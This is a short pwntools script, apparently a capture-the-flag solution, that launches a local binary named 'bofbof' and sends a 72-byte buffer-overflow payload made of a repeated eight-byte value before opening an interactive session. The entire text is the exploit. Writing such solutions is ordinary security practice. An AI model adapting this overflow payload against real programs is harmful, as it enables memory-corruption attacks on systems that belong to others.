from pwn import *

io = process("./bofbof")

io.sendline(b"\x88\x77\x66\x55\x44\x33\x22\x11"*9)

io.interactive()